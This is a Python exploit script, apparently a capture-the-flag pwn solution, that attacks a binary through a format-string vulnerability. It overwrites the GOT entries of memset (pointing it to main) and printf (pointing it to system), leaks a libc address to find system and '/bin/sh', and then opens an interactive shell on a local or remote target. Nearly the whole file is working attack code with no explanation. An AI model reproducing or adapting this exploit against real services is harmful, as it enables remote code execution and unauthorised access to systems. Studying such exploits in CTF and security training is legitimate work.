import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./pwn',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf


def exp(data: bytes):
    start_game()
    sla(b'input:\n', data)
    r = rl()
    return r


position = formats.exp_get_str_position(exp)


def hijack_func_to_main_addr():
    start_game()
    func_got = elf.got['memset']
    main_addr = 0x400aa0
    payload = fmtstr_payload(position, {func_got: main_addr})
    sla(b'input:\n', payload)


hijack_func_to_main_addr()

libc_main_start_position = 25
payload = f'%{libc_main_start_position}$p'
sla(b' input name:\n', payload)
address = rl()[8:20] # 字符串类型取其中的值
address = int(address, 16)
print('address', hex(address))
s.add_condition('__libc_start_main_ret', address)
s.dump(db_index=1)

system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')



def set_printf_to_system(system):
    printf_got_addr = elf.got['printf']
    x = system & 0xffffffff
    a = x & 0xffff
    a1 = printf_got_addr
    b = (x >> 16) & 0xffff
    b1 = printf_got_addr+2
    if(a > b):
        tmp = a
        a = b
        b = tmp
        tmp = a1
        a1 = b1
        b1 = tmp
    s = f"%{a}c%12$hn"
    s += f"%{(b-a)}c%13$hn"
    s = s.ljust(32, 'a')
    s = s.encode()
    s += p64(a1)
    s += p64(b1)
    return s


payload = set_printf_to_system(system_addr)
print(payload)
# payload = fmtstr_payload(position, {elf.got['printf']: system_addr})
# print(payload)
sl(payload)
sl(b'/bin/sh\x00')
interactive()
